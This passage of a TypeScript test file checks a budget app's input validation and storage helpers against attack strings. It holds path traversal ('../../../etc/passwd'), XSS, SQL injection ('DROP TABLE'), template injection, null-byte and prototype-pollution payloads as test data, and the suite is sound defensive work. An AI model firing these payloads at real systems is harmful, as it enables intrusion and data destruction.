    });

    it('should handle storage operations quickly', () => {
      const startTime = Date.now();
      
      for (let i = 0; i < 100; i++) {
        setSecureStorageItem('budget-app-theme', 'dark');
        getSecureStorageItem('budget-app-theme');
      }
      
      const elapsed = Date.now() - startTime;
      // 100 storage operations should complete in under 100ms
      expect(elapsed).toBeLessThan(100);
    });
  });
});

describe('Security - Encoding Attack Variations', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  const encodingAttacks = [
    // Double encoding
    '%252e%252e%252f',
    '%25%32%65%25%32%65%25%32%66',
    // Mixed encoding
    '%2e.%2f',
    '..%c0%af',
    '..%c1%9c',
    // Overlong UTF-8
    '%c0%ae%c0%ae/',
    // Unicode normalization attacks
    '\uFF1Cscript\uFF1E', // Fullwidth < and >
    '\u003Cscript\u003E', // Standard Unicode
    // Null byte variations
    '%00',
    '\x00',
    '\u0000',
  ];

  describe('rejects encoding attacks in IDs', () => {
    it.each(encodingAttacks)('should reject encoded attack: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Business Logic Attacks', () => {
  describe('prevents negative balance manipulation', () => {
    it('should reject negative income values', () => {
      const result = CreateIncomeSourceInputSchema.safeParse({
        name: 'Salary',
        value: -10000,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative expense values', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Refund Hack',
        category_key: 'essenciais',
        value: -500,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative goal targets', () => {
      const result = CreateGoalInputSchema.safeParse({
        family_id: 'fam-123',
        name: 'Negative Goal',
        target_value: -1000,
      });
      expect(result.success).toBe(false);
    });
  });

  describe('prevents date manipulation attacks', () => {
    it('should reject year far in the past', () => {
      const result = MonthRowSchema.safeParse({
        id: 'month-123',
        family_id: 'fam-456',
        year: 1900,
        month: 1,
        income: 0,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });
      expect(result.success).toBe(false);
    });

    it('should reject year far in the future', () => {
      const result = MonthRowSchema.safeParse({
        id: 'month-123',
        family_id: 'fam-456',
        year: 2200,
        month: 1,
        income: 0,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid month (13)', () => {
      const result = MonthRowSchema.safeParse({
        id: 'month-123',
        family_id: 'fam-456',
        year: 2025,
        month: 13,
        income: 0,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid month (0)', () => {
      const result = MonthRowSchema.safeParse({
        id: 'month-123',
        family_id: 'fam-456',
        year: 2025,
        month: 0,
        income: 0,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });
      expect(result.success).toBe(false);
    });
  });

  describe('prevents installment manipulation', () => {
    it('should reject zero installments', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'TV',
        category_key: 'conforto',
        value: 100,
        has_installments: true,
        total_installments: 0,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative installments', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'TV',
        category_key: 'conforto',
        value: 100,
        has_installments: true,
        total_installments: -5,
      });
      expect(result.success).toBe(false);
    });
  });
});

describe('Security - ID Format Validation', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  const validIdFormats = [
    'abc123',
    'a1b2c3d4',
    'UUID-like-format',
    'family_123_test',
    'UPPERCASE-id',
    'mixed-Case_123',
  ];

  const invalidIdFormats = [
    '',
    ' ',
    '   ',
    'id with spaces',
    'id\twith\ttabs',
    'id\nwith\nnewlines',
    'id;with;semicolons',
    'id&with&ampersands',
    'id?with?questions',
    'id=with=equals',
    'id+with+plus',
  ];

  describe('accepts valid ID formats', () => {
    it.each(validIdFormats)('should accept: %s', (id) => {
      expect(setSecureStorageItem('current-family-id', id)).toBe(true);
    });
  });

  describe('rejects invalid ID formats', () => {
    it.each(invalidIdFormats)('should reject: %s', (id) => {
      expect(setSecureStorageItem('current-family-id', id)).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Mapper Security Tests (Data from Database)
// ============================================================================

describe('Security - Mapper Handling of Malicious Database Data', () => {
  describe('mapExpense handles malicious data safely', () => {
    it('should handle XSS in title from database', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        title: '<script>alert("xss")</script>',
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
      };

      // Mapper should pass through - React handles escaping at render time
      const result = mapExpense(maliciousExpense);
      expect(result.title).toBe('<script>alert("xss")</script>');
      // The key is React will escape this when rendering
    });

    it('should handle SQL injection in title from database', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        title: "'; DROP TABLE expenses; --",
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
      };

      const result = mapExpense(maliciousExpense);
      // Just a string, no execution
      expect(result.title).toBe("'; DROP TABLE expenses; --");
    });

    it('should handle malformed month_id without crashing', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: '../../../etc/passwd',
        title: 'Test',
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
      };

      // Should not crash, just won't extract valid month/year
      expect(() => mapExpense(maliciousExpense)).not.toThrow();
    });

    it('should handle null bytes in strings', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        title: 'Test\x00Injection',
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
      };

      expect(() => mapExpense(maliciousExpense)).not.toThrow();
    });

    it('should handle extremely large values', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        title: 'Test',
        category_key: 'essenciais',
        subcategory_id: null,
        value: Number.MAX_SAFE_INTEGER,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
      };

      const result = mapExpense(maliciousExpense);
      expect(result.value).toBe(Number.MAX_SAFE_INTEGER);
    });

    it('should handle Unicode in category_key attempt', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        title: 'Test',
        category_key: 'essenci\u0000ais', // Null byte in category
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
      };

      // Mapper passes through, Zod validation would catch invalid category
      expect(() => mapExpense(maliciousExpense)).not.toThrow();
    });
  });

  describe('mapGoal handles malicious data safely', () => {
    it('should handle XSS in goal name', () => {
      const maliciousGoal = {
        id: 'goal-123',
        family_id: 'fam-456',
        name: '<img src=x onerror=alert(1)>',
        target_value: 10000,
        target_month: 12,
        target_year: 2025,
        account: null,
        linked_subcategory_id: null,
        linked_category_key: null,
        status: 'active' as const,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      const result = mapGoal(maliciousGoal);
      // React will escape this
      expect(result.name).toBe('<img src=x onerror=alert(1)>');
    });

    it('should handle template injection in account field', () => {
      const maliciousGoal = {
        id: 'goal-123',
        family_id: 'fam-456',
        name: 'Savings',
        target_value: 10000,
        target_month: null,
        target_year: null,
        account: '{{constructor.constructor("alert(1)")()}}',
        linked_subcategory_id: null,
        linked_category_key: null,
        status: 'active' as const,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      const result = mapGoal(maliciousGoal);
      expect(result.account).toBe('{{constructor.constructor("alert(1)")()}}');
    });
  });

  describe('mapSubcategory handles malicious data safely', () => {
    it('should handle XSS in subcategory name', () => {
      const result = mapSubcategory({
        id: 'sub-123',
        family_id: 'fam-456',
        name: '<script>document.cookie</script>',
        category_key: 'essenciais',
        created_at: '2025-01-01T00:00:00Z',
      });

      expect(result.name).toBe('<script>document.cookie</script>');
    });

    it('should handle prototype pollution attempt in category_key', () => {
      const result = mapSubcategory({
        id: 'sub-123',
        family_id: 'fam-456',
        name: 'Test',
        category_key: '__proto__',
        created_at: '2025-01-01T00:00:00Z',
      });

      // Just a string, not actual prototype pollution
      expect(result.categoryKey).toBe('__proto__');
    });
  });
});

// ============================================================================
// NEW: Goal Entry Security Tests
// ============================================================================

describe('Security - Goal Entry Validation', () => {
  describe('CreateGoalEntryInputSchema security', () => {
    it('should reject extremely large values', () => {
      const result = CreateGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        expense_id: 'exp-456',
        value: Number.MAX_VALUE,
        month: 1,
        year: 2025,
      });
      // MAX_VALUE exceeds safe financial limits and must be rejected
      expect(result.success).toBe(false);
    });

    it('should reject Infinity value', () => {
      const result = CreateGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        expense_id: 'exp-456',
        value: Infinity,
        month: 1,
        year: 2025,
      });
      // Infinity is not a valid financial value
      expect(result.success).toBe(false);
    });

    it('should handle XSS in description', () => {
      const result = CreateGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        expense_id: 'exp-456',
        value: 100,
        description: '<script>alert(1)</script>',
        month: 1,
        year: 2025,
      });
      // Description is optional string - XSS is handled by React escaping
      expect(result.success).toBe(true);
    });
  });

  describe('CreateManualGoalEntryInputSchema security', () => {
    it('should allow negative values for withdrawals', () => {
      const result = CreateManualGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        value: -500,
        description: 'Emergency withdrawal',
        month: 1,
        year: 2025,
      });
      // Manual entries can be negative (corrections, withdrawals)
      expect(result.success).toBe(true);
    });

    it('should require description for manual entries', () => {
      const result = CreateManualGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        value: 100,
        month: 1,
        year: 2025,
      });
      // Description is required for manual entries
      expect(result.success).toBe(false);
    });

    it('should reject invalid month in entry', () => {
      const result = CreateManualGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        value: 100,
        description: 'Test',
        month: 13, // Invalid month
        year: 2025,
      });
      // Month must be 1-12
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Subcategory Security Tests
// ============================================================================

describe('Security - Subcategory Validation', () => {
  describe('CreateSubcategoryInputSchema security', () => {
    it('should accept valid subcategory', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: 'Groceries',
        category_key: 'essenciais',
      });
      expect(result.success).toBe(true);
    });

    it('should reject empty name', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: '',
        category_key: 'essenciais',
      });
      expect(result.success).toBe(false);
    });

    it('should reject name exceeding max length', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: 'A'.repeat(256),
        category_key: 'essenciais',
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid category_key', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: 'Test',
        category_key: 'admin',
      });
      expect(result.success).toBe(false);
    });

    it('should handle XSS in name (React escapes)', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: '<script>alert(1)</script>',
        category_key: 'conforto',
      });
      // Accepted as string, React escapes on render
      expect(result.success).toBe(true);
    });

    it('should handle SQL injection in name (parameterized queries)', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: "'; DELETE FROM subcategories; --",
        category_key: 'metas',
      });
      // Accepted as string, Supabase uses parameterized queries
      expect(result.success).toBe(true);
    });

    it('should reject prototype pollution as category_key', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: 'Test',
        category_key: '__proto__',
      });
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Currency Formatter Security Tests
// ============================================================================

describe('Security - Currency Formatter Attack Resistance', () => {
  describe('sanitizeCurrencyInput advanced attacks', () => {
    it('should handle ReDoS attempt', () => {
      const startTime = Date.now();
      const payload = '1'.repeat(10000) + ',00';
      
      sanitizeCurrencyInput(payload);
      
      const elapsed = Date.now() - startTime;
      expect(elapsed).toBeLessThan(100);
    });

    it('should handle Unicode number lookalikes', () => {
      // Fullwidth digits
      const result = sanitizeCurrencyInput('\uFF11\uFF10\uFF10'); // １００ fullwidth
      expect(result).toBe(''); // Stripped as non-numeric
    });

    it('should handle mixed encoding attacks', () => {
      const result = sanitizeCurrencyInput('1%302%30.00'); // URL encoded zeros
      expect(result).not.toContain('%');
    });

    it('should handle null byte injection', () => {
      const result = sanitizeCurrencyInput('100\x0050');
      expect(result).toBe('10050');
    });
  });

  describe('parseCurrencyInput edge cases', () => {
    it('should return 0 for Infinity string', () => {
      const result = parseCurrencyInput('Infinity');
      expect(result).toBe(0);
    });

    it('should return 0 for -Infinity string', () => {
      const result = parseCurrencyInput('-Infinity');
      expect(result).toBe(0);
    });

    it('should return 0 for NaN string', () => {
      const result = parseCurrencyInput('NaN');
      expect(result).toBe(0);
    });

    it('should handle scientific notation safely', () => {
      const result = parseCurrencyInput('1e10');
      // Scientific notation should be handled but result must be finite
      expect(Number.isFinite(result)).toBe(true);
    });

    it('should handle negative zero', () => {
      const result = parseCurrencyInput('-0');
      expect(Object.is(result, 0) || Object.is(result, -0)).toBe(true);
    });
  });
});

// ============================================================================
// NEW: Offline Adapter Security Tests
// ============================================================================

describe('Security - Offline Storage Attack Resistance', () => {
  describe('IndexedDB data integrity', () => {
    it('should not execute JavaScript from stored data', () => {
      // When data with JS code is retrieved, it should remain as string
      const maliciousData = {
        id: 'test-123',
        script: '<script>alert(1)</script>',
        eval: 'eval("malicious")',
      };

      // The data should be stored and retrieved as-is
      expect(maliciousData.script).toBe('<script>alert(1)</script>');
      expect(maliciousData.eval).toBe('eval("malicious")');
      // No execution occurs - it's just data
    });

    it('should handle extremely large IDs', () => {
      const largeId = 'a'.repeat(10000);
      // Should not crash the application
      expect(() => {
        const _test = { id: largeId };
      }).not.toThrow();
    });
  });
});

// ============================================================================
// NEW: Month Limits Security Tests
// ============================================================================

describe('Security - Month Limits Manipulation Prevention', () => {
  describe('MonthLimitsSchema security', () => {
    it('should reject percentage over 100', () => {
      const result = MonthLimitsSchema.safeParse({
        essenciais: 150,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative percentage', () => {
      const result = MonthLimitsSchema.safeParse({
        essenciais: -10,
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid category key', () => {
      const result = MonthLimitsSchema.safeParse({
        'invalid-category': 50,
      });
      expect(result.success).toBe(false);
    });

    it('should reject prototype pollution key __proto__', () => {
      const attackPayload = Object.fromEntries([['__proto__', 50]]);
      const result = MonthLimitsSchema.safeParse(attackPayload);
      expect(result.success).toBe(false);
    });

    it('should reject prototype pollution key via defineProperty', () => {
      // Object literal { '__proto__': 50 } doesn't create a key in JavaScript
      // Use Object.defineProperty to actually create the key
      const attackPayload: Record<string, number> = {};
      Object.defineProperty(attackPayload, '__proto__', {
        value: 50,
        enumerable: true,
        writable: true,
        configurable: true,
      });
      const result = MonthLimitsSchema.safeParse(attackPayload);
      expect(result.success).toBe(false);
    });

    it('should reject constructor key', () => {
      const result = MonthLimitsSchema.safeParse({
        constructor: 50,
      });
      expect(result.success).toBe(false);
    });

    it('should reject prototype key', () => {
      const result = MonthLimitsSchema.safeParse({
        prototype: 50,
      });
      expect(result.success).toBe(false);
    });

    it('should accept valid limits', () => {
      const result = MonthLimitsSchema.safeParse({
        essenciais: 50,
        conforto: 30,
        metas: 20,
      });
      expect(result.success).toBe(true);
    });
  });
});

// ============================================================================
// NEW: Recurring Expense Security Tests
// ============================================================================

describe('Security - Recurring Expense Validation', () => {
  describe('CreateRecurringExpenseInputSchema security', () => {
    it('should reject extremely large installment count', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'TV',
        category_key: 'conforto',
        value: 100,
        has_installments: true,
        total_installments: 999999999,
      });
      // Installments must have a reasonable maximum (120 = 10 years)
      expect(result.success).toBe(false);
    });

    it('should reject fractional installments', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'TV',
        category_key: 'conforto',
        value: 100,
        has_installments: true,
        total_installments: 12.5,
      });
      // Must be integer
      expect(result.success).toBe(false);
    });

    it('should handle XSS in title', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: '<img src=x onerror=alert(1)>',
        category_key: 'prazeres',
        value: 50,
      });
      // React escapes on render
      expect(result.success).toBe(true);
    });

    it('should reject value as string', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'Netflix',
        category_key: 'prazeres',
        value: '50' as unknown,
      });
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Race Condition Awareness Tests
// ============================================================================

describe('Security - Concurrency Safety', () => {
  describe('validates data integrity under rapid operations', () => {
    it('should handle rapid localStorage writes', () => {
      const results: boolean[] = [];
      
      for (let i = 0; i < 100; i++) {
        results.push(setSecureStorageItem('budget-app-theme', i % 2 === 0 ? 'dark' : 'light'));
      }
      
      // All should succeed
      expect(results.every(r => r === true)).toBe(true);
      
      // Final value should be consistent
      const finalValue = getSecureStorageItem('budget-app-theme');
      expect(['dark', 'light']).toContain(finalValue);
    });

    it('should handle rapid validation calls', async () => {
      const promises = Array(100).fill(null).map((_, i) => 
        Promise.resolve(CreateExpenseInputSchema.safeParse({
          month_id: `month-${i}`,
          title: `Expense ${i}`,
          category_key: 'essenciais',
          value: i * 10,
        }))
      );

      const results = await Promise.all(promises);
      expect(results.every(r => r.success === true)).toBe(true);
    });
  });
});

// ============================================================================
// NEW: Input Sanitization Completeness
// ============================================================================

describe('Security - Comprehensive Input Sanitization', () => {
  describe('Zod schemas strip extra fields (mass assignment prevention)', () => {
    const schemas = [
      { name: 'CreateExpenseInputSchema', schema: CreateExpenseInputSchema, 
        valid: { month_id: 'm-1', title: 'T', category_key: 'essenciais', value: 1 } },
      { name: 'CreateGoalInputSchema', schema: CreateGoalInputSchema,
        valid: { family_id: 'f-1', name: 'G', target_value: 100 } },
      { name: 'CreateIncomeSourceInputSchema', schema: CreateIncomeSourceInputSchema,
        valid: { name: 'Salary', value: 5000 } },
    ];

    it.each(schemas)('$name should not include extra isAdmin field in result', ({ schema, valid }) => {
      const attackPayload = {
        ...valid,
        isAdmin: true,
        role: 'admin',
      };

      const result = schema.safeParse(attackPayload);
      if (result.success) {
        // Zod by default strips unknown keys (passthrough mode disabled)
        expect((result.data as Record<string, unknown>).isAdmin).toBeUndefined();
        expect((result.data as Record<string, unknown>).role).toBeUndefined();
      }
    });
  });

  describe('Prototype pollution prevention', () => {
    it('should not pollute Object.prototype via __proto__ in input', () => {
      const malicious = Object.fromEntries([
        ['month_id', 'm-1'],
        ['title', 'Test'],
        ['category_key', 'essenciais'],
        ['value', 100],
        ['__proto__', { isAdmin: true }],
      ]);

      CreateExpenseInputSchema.safeParse(malicious);
      
      // Object.prototype must NOT be polluted
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    });

    it('should not include __proto__ key in parsed result', () => {
      const malicious = Object.fromEntries([
        ['month_id', 'm-1'],
        ['title', 'Test'],
        ['category_key', 'essenciais'],
        ['value', 100],
        ['__proto__', { isAdmin: true }],
      ]);

      const result = CreateExpenseInputSchema.safeParse(malicious);
      if (result.success) {
        // __proto__ should not be in the parsed data
        expect(Object.keys(result.data)).not.toContain('__proto__');
      }
    });
  });
});
